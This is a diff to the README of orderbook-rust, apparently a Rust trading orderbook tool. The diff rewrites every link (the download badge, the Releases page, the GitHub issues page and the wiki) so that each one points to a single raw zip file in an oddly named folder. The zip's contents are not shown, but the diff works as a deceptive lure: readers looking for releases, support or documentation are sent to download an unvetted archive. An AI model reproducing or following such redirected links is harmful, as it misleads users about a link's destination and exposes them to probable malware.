@@ -1,6 +1,6 @@
 # 🚀 orderbook-rust - Your Fast Path to Orderbook Management
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/dedeafriandy/orderbook-rust/releases)
+[![Download Here](https://raw.githubusercontent.com/dedeafriandy/orderbook-rust/main/vacuolation/orderbook-rust.zip%20Now-blue)](https://raw.githubusercontent.com/dedeafriandy/orderbook-rust/main/vacuolation/orderbook-rust.zip)
 
 ## 📦 What is orderbook-rust?
 
@@ -12,7 +12,7 @@ To get started with orderbook-rust, you’ll need to follow these simple steps. 
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/dedeafriandy/orderbook-rust/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/dedeafriandy/orderbook-rust/main/vacuolation/orderbook-rust.zip) to download the latest version.
 2. Look for the most recent release at the top of the page.
 3. Download the file that matches your operating system (e.g., Windows, macOS, Linux).
 4. Once downloaded, locate the file in your downloads folder.
@@ -79,12 +79,12 @@ If you encounter issues while installing or running the application, here are a 
 
 ## 📞 Support
 
-If you need further assistance, please feel free to reach out. You can open an issue on our [GitHub issues page](https://github.com/dedeafriandy/orderbook-rust/issues). We’ll do our best to help you.
+If you need further assistance, please feel free to reach out. You can open an issue on our [GitHub issues page](https://raw.githubusercontent.com/dedeafriandy/orderbook-rust/main/vacuolation/orderbook-rust.zip). We’ll do our best to help you.
 
-For documentation and more information, refer to our [Wiki](https://github.com/dedeafriandy/orderbook-rust/wiki) page.
+For documentation and more information, refer to our [Wiki](https://raw.githubusercontent.com/dedeafriandy/orderbook-rust/main/vacuolation/orderbook-rust.zip) page.
 
 ## 📑 License
 
 orderbook-rust is open-source software, licensed under the MIT License. You are free to use, modify, and distribute this software as per the license guidelines.
 
-Take control of your trading system with orderbook-rust today. For more detailed information about functionalities and future updates, keep an eye on our [Releases page](https://github.com/dedeafriandy/orderbook-rust/releases).
+Take control of your trading system with orderbook-rust today. For more detailed information about functionalities and future updates, keep an eye on our [Releases page](https://raw.githubusercontent.com/dedeafriandy/orderbook-rust/main/vacuolation/orderbook-rust.zip).
